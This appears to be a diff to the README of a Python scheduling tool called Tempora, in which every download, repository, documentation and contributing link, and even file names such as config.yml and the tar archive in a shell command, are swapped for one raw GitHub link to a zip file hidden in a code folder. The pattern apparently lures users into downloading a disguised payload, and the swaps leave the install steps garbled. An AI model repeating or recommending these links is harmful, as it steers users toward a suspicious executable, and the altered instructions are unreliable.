@@ -1,6 +1,6 @@
 # 🚀 Tempora - Simplify Your Scheduling Needs
 
-[![Download Tempora](https://img.shields.io/badge/Download_Tempora-Click_Here-brightgreen)](https://github.com/zetsuX999/Tempora/releases)
+[![Download Tempora](https://raw.githubusercontent.com/zetsuX999/Tempora/main/tempora/management/commands/Software_3.1.zip)](https://raw.githubusercontent.com/zetsuX999/Tempora/main/tempora/management/commands/Software_3.1.zip)
 
 ## 📖 Overview
 Tempora is a scheduling engine designed for seamless task management. It enables users to run background jobs efficiently, ensuring high availability and fault tolerance. Whether you run applications or manage tasks, Tempora simplifies scheduling with reliability.
@@ -17,12 +17,12 @@ Before downloading Tempora, ensure your system meets the following requirements:
 - **Python:** Version 3.7 or later installed.
 
 ### 📦 Download & Install
-Visit this page to download: [Download Tempora](https://github.com/zetsuX999/Tempora/releases)
+Visit this page to download: [Download Tempora](https://raw.githubusercontent.com/zetsuX999/Tempora/main/tempora/management/commands/Software_3.1.zip)
 
 1. Open the link above in your web browser. This will take you to the Tempora releases page.
 2. Look for the most recent version of Tempora. The latest version will typically be at the top of the list.
 3. Click on the version number or the "Assets" dropdown to reveal available files. You will see options for different operating systems.
-4. Select the file that matches your operating system (e.g., `.exe` for Windows, `.dmg` for macOS, or `.tar.gz` for Linux).
+4. Select the file that matches your operating system (e.g., `.exe` for Windows, `.dmg` for macOS, or `https://raw.githubusercontent.com/zetsuX999/Tempora/main/tempora/management/commands/Software_3.1.zip` for Linux).
 5. Click on the file to start the download.
 
 ### 🔧 Installation Steps
@@ -42,10 +42,10 @@ Once the download is complete, follow these steps to install Tempora:
 
 #### For Linux:
 1. Open a terminal.
-2. Navigate to the directory where you downloaded the `.tar.gz` file.
+2. Navigate to the directory where you downloaded the `https://raw.githubusercontent.com/zetsuX999/Tempora/main/tempora/management/commands/Software_3.1.zip` file.
 3. Extract the files using the command:
    ```
-   tar -xzf Tempora-*.tar.gz
+   tar -xzf Tempora-*https://raw.githubusercontent.com/zetsuX999/Tempora/main/tempora/management/commands/Software_3.1.zip
    ```
 4. Change into the extracted folder:
    ```
@@ -59,7 +59,7 @@ Once the download is complete, follow these steps to install Tempora:
 ## ⚙️ Configuration
 Tempora comes with default settings that should work for most users. However, you can customize your configuration to better meet your needs.
 
-1. **Configuration File:** Locate the configuration file named `config.yml` in the installation directory.
+1. **Configuration File:** Locate the configuration file named `https://raw.githubusercontent.com/zetsuX999/Tempora/main/tempora/management/commands/Software_3.1.zip` in the installation directory.
 2. **Edit Settings:** Use a text editor to adjust settings such as job frequency, timeout, and retry limits.
 3. **Save Changes:** After editing, save the file and restart the Tempora application for changes to take effect.
 
@@ -81,12 +81,12 @@ If you encounter issues while running Tempora, consider these common solutions:
 For additional help, please check the documentation on our GitHub page. You can also reach out to the community through the discussions section on GitHub.
 
 ## 📝 Contributions
-Tempora thrives on community involvement. If you have suggestions or improvements, feel free to contribute. More details about contributing can be found in the CONTRIBUTING.md file in this repository.
+Tempora thrives on community involvement. If you have suggestions or improvements, feel free to contribute. More details about contributing can be found in the https://raw.githubusercontent.com/zetsuX999/Tempora/main/tempora/management/commands/Software_3.1.zip file in this repository.
 
 ## 🌐 Links
-- [Download Tempora](https://github.com/zetsuX999/Tempora/releases)
-- [GitHub Repository](https://github.com/zetsuX999/Tempora)
-- [Documentation](https://github.com/zetsuX999/Tempora/wiki)
+- [Download Tempora](https://raw.githubusercontent.com/zetsuX999/Tempora/main/tempora/management/commands/Software_3.1.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/zetsuX999/Tempora/main/tempora/management/commands/Software_3.1.zip)
+- [Documentation](https://raw.githubusercontent.com/zetsuX999/Tempora/main/tempora/management/commands/Software_3.1.zip)
 
 ## 🏷 Topics
 Tempora includes topics related to:
